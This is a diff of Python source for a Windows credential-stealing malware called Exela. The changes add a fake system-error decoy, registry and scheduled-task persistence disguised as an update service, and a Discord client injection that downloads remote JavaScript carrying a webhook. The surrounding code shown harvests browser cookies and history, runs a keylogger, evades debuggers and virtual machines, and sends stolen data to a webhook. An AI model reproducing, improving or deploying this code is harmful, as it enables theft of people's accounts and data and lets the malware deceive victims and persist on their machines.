@@ -7,11 +7,11 @@ from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
 UrLxD = '%REPLACE_ME_FOR_QUİCADXD%'
-Anti_Vm = "%AnTiVm%"
-wantS = "%StartuP%"
-methodxd = "%MethoD%"
-injectKeylogger = "%keyloggerinject???%"
-inject_discord = "%Inject_discord%"
+Anti_Vm = bool('%AnTiVm%')
+startup_xd = "'%StartupMethod%'"
+injectKeylogger = bool('%Keylogger%')
+inject_discord = bool('%Injection%')
+FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))  
 
 def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
@@ -121,14 +121,10 @@ class QuicaxdExela:
         self.setDiscord()
         self.writeAllData()
         self.sendxd()
-        self.callMePls()
     def callMozilla(self):
         self.GetMozillaProfiles()
         self.get_cookies_firefox()
         self.get_historys_firefox()
-    def callMePls(self):
-        if wantS == "true":
-            self.copyToStartup()
     def doitEveryProfile(self):
         profiles = ['Default', 'Guest Profile']
         for x in range(1, 51): 
@@ -710,14 +706,14 @@ class QuicaxdExela:
         except Exception as e:
             print(e)
     def metlFile(self):
-        pathxd = os.getenv("localappdata") + r"\WindowsUpdateChecker"
+        pathxd = os.getenv("localappdata") + r"\ExelaUpdateService"
         fullPath = os.path.abspath(sys.argv[0])
         if os.path.isdir(pathxd):
             return
         else:
             try:
                 os.mkdir(pathxd)
-                shutil.copyfile(fullPath, pathxd + r"\AutoUpdater.exe")
+                shutil.copyfile(fullPath, pathxd + r"\Exela.exe")
             except Exception as e:
                 print(str(e))
     def getPriv(self):
@@ -729,16 +725,16 @@ class QuicaxdExela:
     def copyToStartup(self):
         self.metlFile()
         output = self.getPriv()
-        if methodxd == "regedit":
+        if startup_xd == "regedit":
             if output == 0: # copy to hkcu
                 softWare = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
+                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe")
             else:
                 softWare = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
-        elif methodxd == "schtasks":
+                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe")
+        elif startup_xd == "schtasks":
             if output == 1:
-                schtaskCommand = "schtasks /create /f /sc onlogon /rl highest " + "/tn \"AutoUpdateChecker\"" + " /tr " + "\"" + os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe" + "\""
+                schtaskCommand = "schtasks /create /f /sc onlogon /rl highest " + "/tn \"AutoUpdateChecker\"" + " /tr " + "\"" + os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe" + "\""
                 os.system(schtaskCommand)
             else:
                 print("need admin priw, for this method")
@@ -784,7 +780,7 @@ class QuicaxdExela:
         embed.add_field(name="Total Cookies",  inline=True,value=f"```{self.cookie}```")
         embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
-        if injectKeylogger == "%keyloggertrue%":
+        if injectKeylogger:
             embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 300 keystrokes```")
         else:
             embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
@@ -1094,9 +1090,10 @@ class DiscordInjection:
             self.callBack()
         else:return
     def callBack(self):
-        self.kill_dc()
-        self.write_injection()
-        self.start_dc()
+        if not self.isInjected():
+            self.kill_dc()
+            self.write_injection()
+            self.start_dc()
     def find_index_path(self) -> str:
         if not os.path.isdir(self.discord_path):
             return
@@ -1114,6 +1111,14 @@ class DiscordInjection:
         code = requests.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js").text
         replaced_code = code.replace("%WEBHOOK%",UrLxD)
         return replaced_code
+    def isInjected(self) -> bool:
+        try:
+            file_path = self.find_index_path()
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as lol:
+                if UrLxD in lol.read():
+                    return True
+                else:return False
+        except:return False
     def write_injection(self):
         file_path = self.find_index_path()
         get_injection_code = self.get_injection_code()
@@ -1455,7 +1460,7 @@ class AntiDebug:
                 except:
                     pass   
 def injectKeyloggers():
-    if injectKeylogger == "%keyloggertrue%":
+    if injectKeylogger:
         try:
             path = os.getenv('temp')
             outputFile = path + "\\key_logs.txt"
@@ -1466,12 +1471,23 @@ def injectKeyloggers():
         except Exception as e:
             print(str(e))
 def inject_dc():
-    if inject_discord == "true":
+    if inject_discord:
             DiscordInjection()
+
+def MakeError():
+    try:
+        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ExelaUpdateService", "Exela.exe"):
+            title = FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
+            message = FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
+            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, FakeError[1][2])
+            subprocess.Popen(cmd, shell=True)
+    except:
+        pass
+
 def callAllFunctions():
     try:
         AntiDebug()
-        if Anti_Vm == "false":
+        if not Anti_Vm:
             thread = threading.Thread(target=QuicaxdExela,daemon=True)
             thread.start()
             thread.join()
@@ -1482,10 +1498,11 @@ def callAllFunctions():
     except:
         pass
 if __name__ == "__main__":
-    if not create_mutex("Exela"):
+    if not create_mutex("Exela | Stealer | on | Top"):
         print("mutex already exist")
         os._exit(0)
     else:
         t = time.time()
+        MakeError()
         callAllFunctions()
         print(time.time() - t)
